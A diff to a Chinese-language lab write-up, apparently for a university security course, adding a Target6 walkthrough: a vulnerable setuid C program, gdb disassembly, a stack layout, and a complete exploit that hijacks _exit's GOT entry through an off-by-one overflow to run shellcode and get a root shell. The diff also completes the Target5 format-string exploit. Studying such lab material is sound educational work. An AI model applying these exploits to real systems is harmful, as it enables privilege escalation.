@@ -6,6 +6,7 @@
     + [Target3 Integer overflow](#target3-integer-overflow)
     + [Target4 Double free](#target4-double-free)
     + [Target5 Format string](#target5-format-string)
+    + [Target6 Global offset table](#target6-global-offset-table)
 
 # Proj1
 ## Target1 Buffer overflow
@@ -572,6 +573,145 @@ int main(void)
 
   memcpy(sploitstring, fmt, strlen(fmt));
   memcpy(sploitstring + sizeof(sploitstring) - strlen(shellcode) - 4, shellcode, strlen(shellcode));
+
+  char *args[] = { TARGET, sploitstring, NULL };
+  char *env[] = { NULL };
+
+  execve(TARGET, args, env);
+  fprintf(stderr, "execve failed.\n");
+
+  return 0;
+}
+```
+## Target6 Global offset table
+```c
+void nstrcpy(char *out, int outl, char *in)
+{
+  int i, len;
+
+  len = strlen(in);
+  if (len > outl)
+    len = outl;
+
+  for (i = 0; i <= len; i++)
+    out[i] = in[i];
+}
+
+void bar(char *arg)
+{
+  char buf[200];
+
+  nstrcpy(buf, sizeof buf, arg);
+}
+
+void foo(char *argv[])
+{
+  int *p;
+  int a = 0;
+  p = &a;
+
+  bar(argv[1]);
+
+  *p = a;
+
+  _exit(0);
+  /* not reached */
+}
+
+int main(int argc, char *argv[])
+{
+  if (argc != 2)
+    {
+      fprintf(stderr, "target6: argc != 2\n");
+      exit(EXIT_FAILURE);
+    }
+  setuid(0);
+  foo(argv);
+  return 0;
+}
+```
+这题乍一眼看上去好像是第二题，但是其实区别非常非常大，因为`foo`中，最后调用了`_exit(0)`，这样即使修改了return地址，函数`foo`其实不返回，所以无法exploit。仔细看看函数`foo`，调用完函数`bar`之后，执行了`*p = a`，也就是修改了一个指针的内容！如果我们知道`_exit`在GOT中的地址，只要把`_exit`在GOT中的地址改为shellcode的地址，不就能跳入shell了嘛！搞起搞起！
+
+我们先反汇编`foo`，看到最后call了`_exit`
+```console
+(gdb) disass foo
+Dump of assembler code for function foo:
+   0x0804855d <+0>: push   %ebp
+   0x0804855e <+1>: mov    %esp,%ebp
+   0x08048560 <+3>: sub    $0x8,%esp
+=> 0x08048563 <+6>: movl   $0x0,-0x8(%ebp)
+   0x0804856a <+13>:  lea    -0x8(%ebp),%eax
+   0x0804856d <+16>:  mov    %eax,-0x4(%ebp)
+   0x08048570 <+19>:  mov    0x8(%ebp),%eax
+   0x08048573 <+22>:  add    $0x4,%eax
+   0x08048576 <+25>:  mov    (%eax),%eax
+   0x08048578 <+27>:  push   %eax
+   0x08048579 <+28>:  call   0x804853a <bar>
+   0x0804857e <+33>:  add    $0x4,%esp
+   0x08048581 <+36>:  mov    -0x8(%ebp),%edx
+   0x08048584 <+39>:  mov    -0x4(%ebp),%eax
+   0x08048587 <+42>:  mov    %edx,(%eax)
+   0x08048589 <+44>:  push   $0x0
+   0x0804858b <+46>:  call   0x8048380 <_exit@plt>
+End of assembler dump.
+```
+继续反汇编`_exit`，看到`_exit`其实跳入了`0x804a00c`，这个就是`_exit`的GOT地址
+```console
+(gdb) disass 0x8048380
+Dump of assembler code for function _exit@plt:
+   0x08048380 <+0>: jmp    *0x804a00c
+   0x08048386 <+6>: push   $0x0
+   0x0804838b <+11>:  jmp    0x8048370
+End of assembler dump.
+```
+所以，我们要把`_exit`地址中的东西，改为我们要的shellcode的地址，这里是`0xbffffcc0`，要做的是`*(int*)(0x804a00c) = 0xbffffcc0`，这不就是`*p = a`嘛！！！所以，我们来研究下call stack然后把该放的东西塞进去，就行了！一气呵成！
+```bash
+---foo----
+---------- 0xbffffda0 <--- rt
+---------- 0xbffffd9c <--- old_ebp
+*p
+---------- 0xbffffd98 <--- &p
+a
+---------- 0xbffffd94 <--- &a
+---bar----
+arg
+---------- 0xbffffd90
+---------- 0xbffffd8c <--- rt
+0xbffffd9c   溢出之后变成  0xbffffd00
+---------- 0xbffffd88 <--- old_ebp
+    .
+    .
+    .
+----------
+---------- 0xbffffd00 <--- new_ebp
+0x0804a00c
+---------- 0xbffffcfc <--- new &p
+0xbffffcc0
+---------- 0xbffffdf8 <--- new &a
+    .
+    .
+    .
+---------- 0xbffffcc0 <--- buf
+```
+和target2类似的道理，off-by-one溢出之后，`bar`中的`old_ebp`被修改为`0xbffffd00`，当bar返回时候，`%esp`从`%ebp`中load，然后调用`*p = a`，而这时候的`*p`和`a`已经变成了`*new_p`和`new_a`如下所示，然后就修改了GOT里头`_exit`的地址，实际指向了shellcode，成功！
+
+```console
+user@vm-cs155:~/cs155/proj1/sploits$ ./sploit6
+#
+```
+
+
+```c
+int main(void)
+{
+  char sploitstring[201];
+  memset(sploitstring, '\x90', sizeof(sploitstring));
+  sploitstring[200] = 0;
+  int offset = 0xbffffd00 - 0xbffffcc0;
+  *(int *) (sploitstring + offset - 4) = 0x0804a00c;
+  *(int *) (sploitstring + offset - 8) = 0xbffffcc0;
+
+  memcpy(sploitstring, shellcode, strlen(shellcode));
 
   char *args[] = { TARGET, sploitstring, NULL };
   char *env[] = { NULL };
